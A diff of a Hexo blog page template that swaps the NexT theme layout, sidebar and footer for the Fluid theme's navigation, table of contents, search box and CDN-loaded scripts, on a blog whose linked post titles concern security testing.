+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/03/16/补天公益爬虫之土豪厂商/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">补天公益爬虫之土豪厂商</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </div>
+                  <div class="post-next col-6">
+                    
+                    
+                      <a href="/2020/03/03/记一次80万字符过狗注入/">
+                        <span class="hidden-mobile">记一次80万字符过狗注入</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </div>
+                </div>
               
             </div>
 
-            <span class="post-nav-divider"></span>
-
-            <div class="post-nav-prev post-nav-item">
-              
-                <a href="/2020/03/16/补天公益爬虫之土豪厂商/" rel="prev" title="补天公益爬虫之土豪厂商">
-                  补天公益爬虫之土豪厂商 <i class="fa fa-chevron-right"></i>
-                </a>
-              
-            </div>
+            
           </div>
-        
-      </footer>
-    
-  </article>
-  
-  
-  
-
-  </div>
-
-
-          </div>
-          
-
         </div>
-        
-          
-  
-  <div class="toggle sidebar-toggle">
-    <span class="toggle-line toggle-line-first"></span>
-    <span class="toggle-line toggle-line-middle"></span>
-    <span class="toggle-line toggle-line-last"></span>
-  </div>
-
-  <aside class="sidebar">
-    <div class="sidebar-inner">
-        
-        
-        
-        
-      
-
-      <ul class="sidebar-nav motion-element">
-        <li class="sidebar-nav-toc">
-          Table of Contents
-        </li>
-        <li class="sidebar-nav-overview">
-          Overview
-        </li>
-      </ul>
-
-      <!--noindex-->
-      <div class="post-toc-wrap sidebar-panel">
       </div>
-      <!--/noindex-->
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-  <p class="site-author-name" itemprop="name">2cu</p>
-  <div class="site-description" itemprop="description">心之所向皆是遗憾，目之所及皆是过往</div>
-</div>
-<div class="site-state-wrap motion-element">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-        
-          <a href="/archives/">
-        
-          <span class="site-state-item-count">16</span>
-          <span class="site-state-item-name">posts</span>
-        </a>
-      </div>
-    
-      
-      
-      <div class="site-state-item site-state-categories">
-        
-          
-            <a href="/categories/">
-          
-        
-        <span class="site-state-item-count">14</span>
-        <span class="site-state-item-name">categories</span>
-        </a>
-      </div>
-    
-      
-      
-      <div class="site-state-item site-state-tags">
-        
-          
-            <a href="/tags/">
-          
-        
-        <span class="site-state-item-count">13</span>
-        <span class="site-state-item-name">tags</span>
-        </a>
-      </div>
-    
-  </nav>
-</div>
-
-
-  <div class="links-of-blogroll motion-element">
-    <div class="links-of-blogroll-title">
-      <i class="fa fa-fw fa-link"></i>
-      Links
     </div>
-    <ul class="links-of-blogroll-list">
-        <li class="links-of-blogroll-item">
-          <a href="https://mi1itray_axe.gitee.io/" title="https://mi1itray_axe.gitee.io/" rel="noopener" target="_blank">Team233核心人物-张大炮</a>
-        </li>
-      
-    </ul>
-  </div>
-
-      </div>
-
-    </div>
-  </aside>
-  <div id="sidebar-dimmer"></div>
-
-
-        
-      </div>
-    </main>
-
-    <footer class="footer">
-      <div class="footer-inner">
-        
-
-<div class="copyright">
-  &copy; 
-  <span itemprop="copyrightYear">2020</span>
-  <span class="with-love">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">2cu</span>
-</div>
-  <!--<div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0
-  </div>
--->
-  <span class="post-meta-divider">|</span>
-  <div class="theme-info">
-      
-    Theme – <a href="https://muse.theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.4.1
-  </div>
-
-        
-
-
-
-
-
-
-
-
-
-
-
-
-        
-      </div>
-    </footer>
-  </div>
-  
     
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
   
-  <script color='0,0,255' opacity='0.5' zIndex='-1' count='5' src="true"></script>
-  <script size="300" alpha="0.6" zIndex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
-  <script src="/lib/anime.min.js?v=3.1.0"></script>
-  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-<script src="/js/utils.js?v=7.4.1"></script><script src="/js/motion.js?v=7.4.1"></script>
-<script src="/js/schemes/muse.js?v=7.4.1"></script>
-<script src="/js/next-boot.js?v=7.4.1"></script>
-
-
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
   
 
   
-
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
   
 
   
 
-
   
 
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
+        <span>Fluid</span></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/main.js" ></script>
+
+
+  <script  src="/js/lazyload.js" ></script>
+
+
+
   
-  <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
-  
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+
+
+
+<!-- Plugins -->
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "内网笔记&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 </body>
 </html>
